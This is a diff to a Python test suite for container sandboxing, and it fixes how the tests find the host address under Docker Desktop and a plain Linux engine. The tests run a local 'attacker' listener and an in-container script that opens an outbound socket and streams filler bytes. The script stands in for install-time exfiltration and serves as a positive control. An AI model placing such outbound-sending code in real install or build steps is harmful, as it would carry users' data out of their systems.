@@ -40,8 +40,18 @@ configuration file:
   and nothing sent by the (now-dead) risky-phase process arrives after its
   container's teardown completes.
 
-Requires a working Docker Desktop with Linux containers -- the same local
+Requires a working Docker daemon serving Linux containers -- the same local
 toolchain dependency this suite already has on the Postgres container.
+
+**Which address names the host is a property of the backend, and getting it
+wrong disarmed both positive controls.** `host.docker.internal` was written in
+here as a literal; Docker Desktop publishes it and a plain Linux Docker Engine
+does not, so on a GitHub runner the exfiltration process connected to nothing,
+no byte ever reached the listener, and the two tests that depend on a positive
+control failed with `assert 0 > 0`. A failing positive control is the one
+outcome that is neither an honest pass nor an honest failure: it says the
+measurement did not happen. `host_addresses` below carries the mapping that
+fixes it and the argument for its shape.
 """
 
 from __future__ import annotations
@@ -79,11 +89,71 @@ def _run_docker(*args: str, timeout: float = _EXEC_TIMEOUT_SECONDS) -> subproces
     )
 
 
+_RESOLVE_SCRIPT = (
+    "import socket, sys\n"
+    "try:\n"
+    "    print(socket.gethostbyname('host.docker.internal'))\n"
+    "except OSError:\n"
+    "    sys.exit(1)\n"
+)
+
+
+def host_addresses(resolved: str | None, route_table: str) -> list[str]:
+    """Every address the host's listener may answer on, seen from inside a container.
+
+    Two candidates, because no single one works on both backends and the tests below have to
+    run on both. `host.docker.internal` is a Docker Desktop convenience: on Windows and macOS
+    it names the real host across the virtual machine Docker runs inside, and a plain Linux
+    Docker Engine -- which is what a GitHub runner has -- does not publish it at all unless a
+    container was created with `--add-host=...:host-gateway`. The default gateway is the
+    opposite: on Linux it *is* the host, and under Docker Desktop it is only the virtual
+    machine, which is not where a test's listener is bound.
+
+    Ordered rather than unioned, and the order is the whole of the platform mapping:
+    `host.docker.internal` first, so Docker Desktop never falls through to a gateway that
+    cannot reach the listener bound on its host.
+
+    `resolved` is what `socket.gethostbyname('host.docker.internal')` answered inside the
+    container, or None when it answered nothing. `route_table` is that container's
+    `/proc/net/route`, whose gateway column is a little-endian hex quad.
+
+    A pure function taking both platforms' inputs, for the reason `scripts/oasdiff_asset.sh` is
+    one: this machine runs Docker Desktop and can never execute the other branch, so the branch
+    it cannot execute is tested by handing it that platform's bytes rather than by trusting it.
+    """
+    candidates = [] if resolved is None else [resolved]
+    for line in route_table.splitlines()[1:]:
+        fields = line.split()
+        if len(fields) > 2 and fields[1] == "00000000" and fields[2] != "00000000":
+            gateway = ".".join(str(byte) for byte in bytes.fromhex(fields[2])[::-1])
+            if gateway not in candidates:
+                candidates.append(gateway)
+    return candidates
+
+
+def _host_addresses(container) -> list[str]:
+    """`host_addresses` asked of a real container, through its own network namespace."""
+    resolve = _run_docker("exec", container.id, "python3", "-c", _RESOLVE_SCRIPT)
+    route = _run_docker("exec", container.id, "cat", "/proc/net/route")
+    assert route.returncode == 0, f"could not read /proc/net/route: {route.stderr}"
+
+    addresses = host_addresses(
+        resolve.stdout.strip() if resolve.returncode == 0 else None, route.stdout
+    )
+    assert addresses, (
+        "no address inside this container names the host: `host.docker.internal` did not "
+        f"resolve ({resolve.stdout.strip() or resolve.stderr.strip()}) and /proc/net/route "
+        f"carries no default gateway:\n{route.stdout}"
+    )
+    return addresses
+
+
 def _start_attacker_listener() -> tuple[socket.socket, int, dict[str, int], threading.Event]:
     """A plain TCP server standing in for the attacker-controlled endpoint the
     threat model describes -- a real socket accepting a real connection over
-    Docker's real network stack, reached from inside a container via `docker
-    exec`'s own view of `host.docker.internal` rather than anything mocked.
+    Docker's real network stack, reached from inside a container at whatever
+    address `host_addresses` says names this host there, rather than anything
+    mocked.
 
     Returns `(server_socket, port, received, stop)`. `received["bytes"]` is
     updated by a background thread as data arrives, so a test can watch it
@@ -121,15 +191,30 @@ def _start_attacker_listener() -> tuple[socket.socket, int, dict[str, int], thre
     return server, port, received, stop
 
 
-def _exfiltrate_in_background(container, port: int) -> None:
+def _exfiltrate_in_background(container, port: int, addresses: list[str]) -> None:
     """Start a process inside `container` that connects to the listener on the
     host at `port` and sends continuously until the socket refuses a write --
     the exact shape the review's attack takes: code running during dependency
     install opens one outbound socket and keeps writing to it.
+
+    Every candidate in `addresses` is tried in order and the first that connects wins, because
+    which one names the host is a property of the backend rather than of this test. Hardcoding
+    `host.docker.internal` here made the positive control below fail on every Linux runner --
+    no data ever reached the listener, so the test proved nothing rather than failing honestly.
     """
     script = (
-        "import socket, time\n"
-        f"s = socket.create_connection(('host.docker.internal', {port}), timeout=5)\n"
+        "import socket, time, sys\n"
+        f"port = {port}\n"
+        f"hosts = {addresses!r}\n"
+        "s = None\n"
+        "for host in hosts:\n"
+        "    try:\n"
+        "        s = socket.create_connection((host, port), timeout=5)\n"
+        "        break\n"
+        "    except OSError:\n"
+        "        continue\n"
+        "if s is None:\n"
+        "    sys.exit(1)\n"
         "while True:\n"
         "    try:\n"
         "        s.sendall(b'x' * 1024)\n"
@@ -139,6 +224,47 @@ def _exfiltrate_in_background(container, port: int) -> None:
     )
     result = _run_docker("exec", "-d", container.id, "python3", "-c", script)
     assert result.returncode == 0, f"failed to start the exfiltration process: {result.stderr}"
+
+
+# A real `/proc/net/route` from a `python:3.12-slim` container on Docker's default bridge. The
+# gateway column is a little-endian hex quad: `010011AC` reversed is 172.17.0.1.
+_LINUX_ROUTE_TABLE = (
+    "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
+    "eth0\t00000000\t010011AC\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
+    "eth0\t000011AC\t00000000\t0001\t0\t0\t0\t0000FFFF\t0\t0\t0\n"
+)
+
+
+def test_a_linux_engine_container_names_the_host_by_its_default_gateway():
+    """The branch this machine cannot execute, handed the bytes a machine that can produces.
+
+    A plain Docker Engine publishes no `host.docker.internal`, so the resolution fails and the
+    default gateway is the only address that names the host. Getting this wrong is not a failing
+    test -- it is a *positive control* that never fires, which reports the container boundary as
+    proven when nothing was measured.
+    """
+    assert host_addresses(None, _LINUX_ROUTE_TABLE) == ["172.17.0.1"]
+
+
+def test_docker_desktop_prefers_the_name_that_crosses_its_virtual_machine():
+    """Order, not membership. Under Docker Desktop the default gateway is the Linux virtual
+    machine Docker runs inside, and a listener bound on the real host is not there -- so a
+    candidate list that reached for the gateway first would connect to the wrong machine and
+    then wait for bytes that never arrive."""
+    assert host_addresses("192.168.65.254", _LINUX_ROUTE_TABLE) == [
+        "192.168.65.254", "172.17.0.1",
+    ]
+
+
+def test_a_container_with_no_default_route_yields_nothing_rather_than_a_guess():
+    """`network="none"` has no default route and no resolver. An empty list is the honest
+    answer; a fabricated address would make the never-networked probe below assert against a
+    host nothing was ever listening on, which passes for the wrong reason."""
+    no_default = (
+        "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
+    )
+
+    assert host_addresses(None, no_default) == []
 
 
 def test_patch_agent_execution_context_reaches_arbitrary_host_today(tmp_path):
@@ -245,7 +371,7 @@ def test_disconnect_network_does_not_stop_an_already_open_socket():
     server, port, received, stop = _start_attacker_listener()
     try:
         with sandbox.ephemeral_container(image=_TEST_IMAGE) as container:
-            _exfiltrate_in_background(container, port)
+            _exfiltrate_in_background(container, port, _host_addresses(container))
             time.sleep(0.5)
             before = received["bytes"]
             assert before > 0, "positive control failed: no data reached the listener before disconnect"
@@ -303,7 +429,8 @@ def test_never_networked_container_receives_nothing_after_install_container_is_t
             )
             assert write.returncode == 0, write.stderr
 
-            _exfiltrate_in_background(install_container, port)
+            addresses = _host_addresses(install_container)
+            _exfiltrate_in_background(install_container, port, addresses)
             time.sleep(0.5)
             before = received["bytes"]
             assert before > 0, "positive control failed: no data reached the listener before teardown"
@@ -311,11 +438,16 @@ def test_never_networked_container_receives_nothing_after_install_container_is_t
             with sandbox.ephemeral_container(image=_TEST_IMAGE, network="none") as patch_container:
                 sandbox.copy_between_containers(install_container, patch_container, "/workspace/artifact")
 
-                never_reachable = sandbox.probe_connect(patch_container, "host.docker.internal", port)
-                assert not never_reachable.reachable, (
-                    "the patch container was created with no network and must never "
-                    f"reach the listener: {never_reachable.detail}"
-                )
+                # Every address that reached the listener from the networked container, refused
+                # from this one. A single name would leave the refusal ambiguous on a backend
+                # that does not publish it: unreachable because there is no route is the claim,
+                # and unreachable because the name does not resolve is not the same statement.
+                for address in addresses:
+                    never_reachable = sandbox.probe_connect(patch_container, address, port)
+                    assert not never_reachable.reachable, (
+                        "the patch container was created with no network and must never "
+                        f"reach the listener at {address}: {never_reachable.detail}"
+                    )
 
                 read_back = _run_docker(
                     "exec", patch_container.id, "cat", "/workspace/artifact/payload.txt",
